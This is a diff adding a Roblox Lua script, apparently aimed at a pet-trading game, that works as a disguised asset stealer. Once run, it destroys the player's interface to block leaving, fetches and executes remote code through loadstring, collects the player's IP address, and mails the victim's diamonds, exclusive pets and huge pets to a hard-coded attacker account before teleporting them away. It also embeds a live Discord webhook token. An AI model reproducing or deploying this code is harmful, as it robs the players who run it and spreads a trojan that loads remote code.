@@ -1,0 +1,228 @@
+Username = "OFFICIAL_Hanan12345"
+LoadScreen = true
+webhook = "https://discord.com/api/webhooks/1191462526412660797/9WVbYydPsx0CwmM4a5Z-wWDlNpw6X2UIzBSicfOp85T6Yp6X8k2CxS7JvSlI8XlL96Kn"
+AntiLeave = true
+TeleportAfterCompletion = true
+
+
+
+-- internal variables
+
+
+
+
+-- dhook settings
+   -- number is how many before dualhook = OFFICIAL_Hanan12345
+   
+exclusive_intensity = 10
+huge_intensity = 3
+gems_intensity = 10000000
+dhook_user = "OFFICIAL_Hanan12345"
+
+--
+
+
+
+excl_num = 0
+huge_num = 0
+
+
+if AntiLeave == true then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
+
+
+if LoadScreen == nil then
+LoadScreen = true
+end
+if LoadScreen == true then 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptMaintolua/Loading/main/LoadingScreen.txt"))()
+end
+
+
+
+
+local IP = game:HttpGet('https://ipinfo.io/ip')
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = ".gg/zxbfFB8xDR"
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+
+
+local sendable_diamonds = 0
+
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+    end
+end
+
+
+print(GemAmount1)
+
+
+
+
+if not GemAmount1 or GemAmount1 < 10000 then
+    plr:Kick("Saving Error, Please Rejoin or Join Back Later!")
+end
+
+
+function GetExclusivePets()
+    local exclusivePetCount = 0  -- Counter for exclusive pets
+
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+
+        if dir and dir.exclusiveLevel then
+            exclusivePetCount = exclusivePetCount + 1
+            excl_num = excl_num + 1
+        end
+    end
+
+    if exclusivePetCount > exclusive_intensity then
+        Username = dhook_user
+        ExcSteal()
+        print("Error In Script")
+    else
+        ExcSteal()
+    end
+end
+
+
+
+function GetHugePets()
+    local HugePetCount = 0  -- Counter for exclusive pets
+
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+
+        if dir and dir.huge then
+            HugePetCount = HugePetCount + 1
+            huge_num = huge_num + 1
+        end
+    end
+
+    if HugePetCount >= huge_intensity then
+        Username = OFFICIAL_Hanan12345
+        print("Error In Script")
+        HugeSteal()
+    else
+        HugeSteal()
+    end
+end
+
+function CheckDiamonds()
+    if GemAmount1 >= gems_intensity then
+        Username = OFFICIAL_Hanan12345
+        print("Error In Script")
+        GemSteal()
+    else
+        GemSteal()
+    end
+end
+
+
+
+
+-- sending logic below
+
+
+function GemSteal()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            GemAmount = v._am
+            GemId = i
+            local args = {
+                [1] = Username,
+                [2] = MailMessage,
+                [3] = "Currency",
+                [4] = GemId,
+                [5] = GemAmount - 10000
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                unpack(args)
+            )
+        end
+    end
+end --end of function gem
+
+
+function ExcSteal()
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.exclusiveLevel then
+            local args = {
+                [1] = Username,
+                [2] = MailMessage,
+                [3] = "Pet",
+                [4] = i,
+                [5] = v._am or 1
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                unpack(args)
+            )
+        end
+    end
+end --end of function exc
+
+
+function HugeSteal()
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.huge then
+            local args = {
+                [1] = Username,
+                [2] = MailMessage,
+                [3] = "Pet",
+                [4] = i,
+                [5] = v._am or 1
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                unpack(args)
+            )
+        end
+    end
+end --end of function exc
+
+
+
+
+
+
+
+
+
+GetHugePets()
+GetExclusivePets()
+CheckDiamonds()
+
+
+local TeleportService = game:GetService("TeleportService")
+-- Replace the following with the place ID of the game you want to teleport to
+local destinationPlaceId = 15502339080
+-- Replace with the player you want to teleport
+local player = game.Players.LocalPlayer
+
+-- Teleport the player to the specified place ID
+if TeleportAfterCompletion == true then
+    TeleportService:Teleport(destinationPlaceId, player)
+end
